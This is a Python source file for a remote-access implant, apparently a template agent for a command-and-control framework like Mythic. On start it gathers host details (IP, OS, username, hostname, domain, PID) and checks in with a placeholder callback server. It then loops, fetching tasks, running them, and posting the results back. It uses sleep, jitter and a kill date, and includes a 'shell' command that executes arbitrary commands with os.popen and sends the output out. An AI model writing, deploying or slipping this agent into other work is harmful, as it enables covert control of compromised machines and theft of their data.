import os
import sys
import json
import socket
import urllib.request
import threading
import queue
import time
import random
import platform
import getpass
from datetime import datetime

class Igider:
    """
    Determines and returns the operating system version.
    Prioritizes macOS version if available, otherwise returns system name and release.
    """
    def getOSVersion(self):
        if platform.mac_ver()[0]:
            return "macOS " + platform.mac_ver()[0]
        return platform.system() + " " + platform.release()

    """
    Retrieves the current username using getpass or environment variables.
    """
    def getUsername(self):
        try:
            return getpass.getuser()
        except:
            for k in ["USER", "LOGNAME", "USERNAME"]:
                if k in os.environ:
                    return os.environ[k]
        return "unknown"

    """
    Sends a JSON message to the server via a POST request and returns the response as a JSON object.
    """
    def postMessageAndRetrieveResponse(self, data):
        try:
            headers = self.agent_config["Headers"]
            req = urllib.request.Request(
                f"{self.agent_config['Server']}:{self.agent_config['Port']}{self.agent_config['PostURI']}",
                data=json.dumps(data).encode(),
                headers=headers
            )
            with urllib.request.urlopen(req) as response:
                return json.loads(response.read().decode())
        except Exception as e:
            print(f"Error in POST request: {e}")
            return {}

    """
    Sends a GET request to retrieve tasks from the server.
    """
    def getMessageAndRetrieveResponse(self, data):
        try:
            headers = self.agent_config["Headers"]
            req = urllib.request.Request(
                f"{self.agent_config['Server']}:{self.agent_config['Port']}{self.agent_config['GetURI']}?{self.agent_config['GetParam']}={json.dumps(data)}",
                headers=headers
            )
            with urllib.request.urlopen(req) as response:
                return json.loads(response.read().decode())
        except Exception as e:
            print(f"Error in GET request: {e}")
            return {}

    """
    Sends task output to the server, marking the task as not completed.
    """
    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{"task_id": task_id, "user_output": output, "completed": False}]
        message = {"action": "post_response", "responses": responses}
        self.postMessageAndRetrieveResponse(message)

    """
    Sends completed task responses to the server and removes successful tasks.
    """
    def postResponses(self):
        try:
            responses = []
            for task in self.taskings:
                if task["completed"]:
                    out = {"task_id": task["task_id"], "user_output": task["result"], "completed": True}
                    if task.get("error"):
                        out["status"] = "error"
                    responses.append(out)
            if responses:
                message = {"action": "post_response", "responses": responses}
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data.get("responses", []):
                    if resp.get("status") == "success":
                        self.taskings = [t for t in self.taskings if t["task_id"] != resp["task_id"]]
        except Exception as e:
            print(f"Error posting responses: {e}")

    """
    Executes a task by calling the corresponding agent function.
    """
    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if callable(function):
                params = json.loads(task["parameters"]) if task["parameters"] else {}
                params['task_id'] = task["task_id"]
                output = function(**params)
                task["result"] = output
            else:
                task["error"] = True
                task["result"] = f"Command {task['command']} not found"
            task["completed"] = True
        except Exception as e:
            task["error"] = True
            task["result"] = str(e)
            task["completed"] = True

    """
    Processes tasks by creating threads for unstarted tasks.
    """
    def processTaskings(self):
        threads = []
        for task in self.taskings:
            if not task["started"]:
                thread = threading.Thread(
                    target=self.processTask,
                    name=f"{task['command']}:{task['task_id']}",
                    args=(task,)
                )
                threads.append(thread)
                thread.start()

    """
    Requests new tasks from the server and adds them to the task list.
    """
    def getTaskings(self):
        data = {"action": "get_tasking", "tasking_size": -1}
        tasking_data = self.getMessageAndRetrieveResponse(data)
        for task in tasking_data.get("tasks", []):
            t = {
                "task_id": task["id"],
                "command": task["command"],
                "parameters": task["parameters"],
                "result": "",
                "completed": False,
                "started": False,
                "error": False
            }
            self.taskings.append(t)

    """
    Performs initial check-in to the server to register the agent.
    """
    def checkIn(self):
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname) if hostname else ""
            data = {
                "action": "checkin",
                "ip": ip,
                "os": self.getOSVersion(),
                "user": self.getUsername(),
                "host": hostname,
                "domain": socket.getfqdn(),
                "pid": os.getpid(),
                "uuid": self.agent_config["PayloadUUID"],
                "architecture": "x64" if sys.maxsize > 2**32 else "x86"
            }
            response = self.postMessageAndRetrieveResponse(data)
            if response.get("status") == "success":
                self.agent_config["UUID"] = response["id"]
                return True
            return False
        except Exception as e:
            print(f"Check-in failed: {e}")
            return False

    """
    Pauses execution based on sleep interval and jitter.
    """
    def agentSleep(self):
        jitter = 0
        if int(self.agent_config["Jitter"]) > 0:
            jitter_value = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"]) / 100)
            if int(jitter_value) > 0:
                jitter = random.randrange(0, int(jitter_value))
        time.sleep(self.agent_config["Sleep"] + jitter)

    """
    Exits the agent if the kill date has passed.
    """
    def passedKilldate(self):
        try:
            kd_list = [int(x) for x in self.agent_config["KillDate"].split("-")]
            kill_date = datetime(kd_list[0], kd_list[1], kd_list[2])
            return datetime.now() >= kill_date
        except:
            return False

    """
    Exits the agent.
    """
    def exit(self):
        sys.exit(0)

    """
    Example command: Execute a shell command (placeholder for actual commands).
    """
    def shell(self, task_id, command):
        try:
            result = os.popen(command).read()
            self.sendTaskOutputUpdate(task_id, result)
            return result
        except Exception as e:
            return str(e)

    """
    Initializes the agent and enters the main loop.
    """
    def __init__(self):
        self.taskings = []
        self.agent_config = {
            "Server": "callback_host",
            "Port": "callback_port",
            "PostURI": "/post_uri",
            "GetURI": "/get_uri",
            "GetParam": "query_path_name",
            "PayloadUUID": "UUID_HERE",
            "UUID": "",
            "Headers": {"User-Agent": "Mozilla/5.0"},
            "Sleep": 5,
            "Jitter": 10,
            "KillDate": "9999-12-31"
        }

        while True:
            if not self.agent_config["UUID"]:
                if not self.checkIn():
                    self.agentSleep()
                    continue
            if self.passedKilldate():
                self.exit()
            try:
                self.getTaskings()
                self.processTaskings()
                self.postResponses()
            except Exception as e:
                print(f"Error in main loop: {e}")
            self.agentSleep()

if __name__ == "__main__":
    igider = Igider()